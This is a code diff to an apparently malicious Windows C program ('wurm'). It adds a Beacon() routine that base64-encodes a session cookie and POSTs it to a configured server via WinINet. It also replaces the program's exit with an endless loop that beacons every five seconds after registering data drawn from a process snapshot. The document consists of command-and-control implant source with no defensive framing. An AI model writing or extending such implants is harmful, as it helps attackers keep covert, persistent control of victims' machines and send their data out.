@@ -7,22 +7,22 @@
 
 struct {
     struct {
-        CHAR* address;
-        CHAR* path;
-        CHAR* user_agent;
+        CHAR*   address;
+        CHAR*   path;
+        CHAR*   user_agent;
         INT     port;
     } http;
     struct {
-        CHAR* cookie;
-        CHAR* keyword;
+        CHAR*   cookie;
+        CHAR*   keyword;
     } auth;
     struct {
-        CHAR* status;
-        CHAR* format;
-        CHAR* buffer; // must be freed
-        CHAR* encode; // must be freed
-        CHAR  length[MAX_PATH];
-        DWORD size;
+        CHAR*   status;
+        CHAR*   format;
+        CHAR*   buffer; // must be freed
+        CHAR*   encode; // must be freed
+        CHAR    length[MAX_PATH];
+        DWORD   size;
     } data;
     struct {
         CHAR*   name; // must be freed
@@ -86,24 +86,32 @@ void Request() {
     hInternet = InternetOpenA(wurm.http.user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     if (hInternet == NULL) {
         printf("Error: %lu\n", dw_error);
+        // exit(1);
     }
 
     // Set handle to connect to specified address and port
     hConnect = InternetConnectA(hInternet, wurm.http.address, wurm.http.port, 0, 0, INTERNET_SERVICE_HTTP, 0, 0);
     if (hConnect == NULL) {
         printf("Error: %lu\n", dw_error);
+        // exit(1);
     }
 
     // Set handle to store a request to be sent
     hRequest = HttpOpenRequestA(hConnect, "POST", wurm.http.path, 0, 0, 0, 0, 0);
     if (hRequest == NULL) {
         printf("Error: %lu\n", dw_error);
+        // exit(1);
     }
 
     // Add request headers and send previously stored request handle
     if (hInternet != NULL && hConnect != NULL && hRequest != NULL) {
         HttpAddRequestHeadersA(hRequest, wurm.data.length, -1, HTTP_ADDREQ_FLAG_ADD); // Set content-length header 
-        HttpSendRequestA(hRequest, 0, 0, wurm.data.buffer, wurm.data.size);
+        if (HttpSendRequestA(hRequest, 0, 0, wurm.data.buffer, wurm.data.size) == FALSE) {
+            printf("Error: %lu\n", dw_error);
+            // exit(1);
+        } else {
+            printf("Response received");
+        }
     } else {
         printf("Error: %lu\n", dw_error);
     }
@@ -194,7 +202,7 @@ void Register() {
     Encode(data_pointer, data_length);
 
     // Allocate buffer in data structure
-    CHAR* buffer = wurm.data.encode; // Note: wurm.data.encode does not need to be freed because it is buffer is pointing its allocation from it.
+    CHAR* buffer = wurm.data.encode;
     Package(buffer);
 
     // Send request to server
@@ -204,6 +212,47 @@ void Register() {
     CloseHandle(snapshot);
     free(data_pointer);
     free(wurm.info.name); // Strdup requires variable to be freed
+}
+
+void Beacon() {
+    /*
+    Baecon data structure:
+        Format (Status:Key)
+        Strings/Integers:
+            Status          8 
+            Key/Cookie      16
+    */
+
+    // Set local variables
+    // DWORD dw_error = GetLastError();
+
+    // Set data allocation format
+    wurm.data.status = "beacon";
+    wurm.data.format = "%s:%s";
+
+    if (wurm.auth.cookie == NULL) {
+        printf("Error: Cookie not set\n");
+        exit(1);
+    }
+
+    // Allocate memory to be encoded
+    DWORD pointer_length = strlen(wurm.data.format) + strlen(wurm.data.status) + strlen(wurm.auth.cookie);
+    CHAR* data_pointer = malloc(pointer_length); // Must be freed
+    sprintf_s(data_pointer, pointer_length, wurm.data.format, wurm.data.status, wurm.auth.cookie);
+
+    // Base-64 encode the allocated data structure 
+    DWORD data_length = strlen(wurm.data.status) + strlen(wurm.auth.cookie) + 1; // Add null byte
+    Encode(data_pointer, data_length);
+
+    // Allocate buffer in data structure
+    CHAR* buffer = wurm.data.encode;
+    Package(buffer);
+
+    // Send request to server
+    Request();
+
+    // Clean up memory
+    free(data_pointer);
 }
 
 int main(int argc, char* argv[]) {
@@ -235,5 +284,9 @@ int main(int argc, char* argv[]) {
     // Attempt initial beacon with registration data
     // Note: To properly send a beacon, a format and status must be set, data must be encoded and stored, then a buffer must be set along with its size and length 
     Register();
-    printf("All done!");
+
+    while (TRUE) {
+        Beacon();
+        Sleep(5000);
+    }
 }
